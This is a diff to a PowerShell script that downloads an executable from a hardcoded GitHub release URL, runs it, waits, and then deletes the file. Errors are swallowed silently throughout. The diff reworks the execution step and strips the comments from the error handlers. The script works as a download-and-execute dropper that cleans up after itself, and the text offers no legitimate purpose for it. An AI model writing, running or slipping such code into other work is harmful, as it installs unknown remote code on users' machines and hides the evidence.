@@ -1,4 +1,5 @@
 $HardcodedUrl = "https://github.com/kagagagag/html/releases/download/test/test.exe"
+$process = $null
 
 try {
     $Uri = [System.Uri]$HardcodedUrl
@@ -17,19 +18,19 @@ try {
     New-Item -ItemType Directory -Path $targetDir -Force -ErrorAction SilentlyContinue
     Invoke-WebRequest -Uri $HardcodedUrl -OutFile $downloadPath -UseBasicParsing -ErrorAction Stop
     if (Test-Path $downloadPath) {
-        & $downloadPath
+        $process = Start-Process -FilePath $downloadPath -PassThru -Wait -ErrorAction Stop
     } else {
         return
     }
 } catch {
-    # Execution stops here if download or execution fails with -ErrorAction Stop
+
 } finally {
-    Start-Sleep -Seconds 5
     if (Test-Path $downloadPath) {
         try {
+            Start-Sleep -Seconds 1
             Remove-Item -Path $downloadPath -Force -ErrorAction Stop
         } catch {
-            # Deletion error occurred, silently continue or handle if necessary
+
         }
     }
 }
